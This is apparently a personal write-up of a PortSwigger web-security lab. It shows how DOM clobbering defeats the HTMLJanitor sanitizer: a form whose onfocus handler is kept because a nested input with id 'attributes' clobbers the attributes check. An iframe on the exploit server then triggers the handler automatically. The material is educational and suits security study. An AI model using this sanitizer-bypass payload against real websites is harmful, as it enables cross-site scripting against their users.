# [Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)

> post a comment on one of the blogs, then return to the blog

- the blogs get sanitized by `HTMLJanitor` with two js files:

`/resources/js/loadCommentsWithHtmlJanitor.js`

`/resources/js/htmlJanitor.js`

> whitelist in `loadCommentsWithHtmlJanitor.js`

- there is a white list for tags and attributes in the `function loadComments(postCommentPath) {...}`

```js
let janitor = new HTMLJanitor({
  tags: {
    input: { name: true, type: true, value: true },
    form: { id: true },
    i: {},
    b: {},
    p: {},
  },
});
```

- it lets the `<input>` with `name`, `type`, `value` attributes
- it lets the `<form>` with `id` attribute

> sanitize in `htmlJanitor.js`

- the function checks the comment html tag and checks if the `attributes` prop is whitelisted or not

```js
// Sanitize attributes
for (var a = 0; a < node.attributes.length; a += 1) {
  var attr = node.attributes[a];

  if (shouldRejectAttr(attr, allowedAttrs, node)) {
    node.removeAttribute(attr.name);
    // Shift the array to continue looping.
    a = a - 1;
  }
}
```

> how to make the from have `onfocus="print()"` without it get sanitized

- the exploit would be great with a `<form id="x" tabindex="0" onfocus="print()">`
- but the `onfocus="print()"` get sanitized in the `htmlJanitor.js` it is not in th whitelist

- in `chrome` the html like this:

```html
<form id="x"><input id="attributes" /></form>
```

- would generate an `x` object with an `attributes` in the `window` object

```
window.x.attributes
->
<input id="attributes" />
```

- in this case the `node.attributes` aka `x.attributes` would be the `<input>` tag in the `<form>` and not the `x` aka the `<form>` itself
- the `htmlJanitor.js` will check the `<input>` itself and will remove the `id` attr, but that time the `<form>` tag already in the clear

> the exploit

- post the following html in the blog

```html
<form id="x" tabindex="0" onfocus="print()"><input id="attributes" /></form>
```

- in the exploit server add this `<iframe>`:

```html
<iframe src=https://actual-blog-url onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

- it will render the blog with the exploit in the `<iframe>`
- `onload` it will scroll to the `'#x'` aka the `x` id element aka to the exploit `<form>`
- the 500ms delay only needed because the blog content might not rendered on init load
